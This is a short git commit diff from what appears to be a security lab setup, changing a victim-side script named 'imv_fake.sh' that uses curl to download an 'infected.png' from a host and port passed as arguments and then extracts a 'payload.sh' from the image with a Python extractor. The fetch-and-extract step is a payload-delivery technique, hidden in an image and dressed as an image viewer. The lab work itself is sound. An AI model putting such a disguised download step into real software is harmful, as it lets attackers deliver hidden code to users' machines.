0c56f1e337a0316d80aa0d607c7f9dfd71f53867
Ismael Moniz <hismamoniz@gmail.com>
2026-05-11 22:31:25 +0100

    improvements to docker setup

--- labsetup/victim/imv_fake.sh
+++ labsetup/victim/imv_fake.sh
@@ -1,6 +1,10 @@
 #!/bin/sh
-
-curl -o infected.png http://"$1":"$2"/infected.png
+set -e
+if [ "$#" -ne 3 ]; then
+    echo "Illegal number of parameters"
+fi
+	
+curl -o infected.png http://"$1":"$2"/"$3"
 
 python3 extractor.py infected.png payload.sh
 
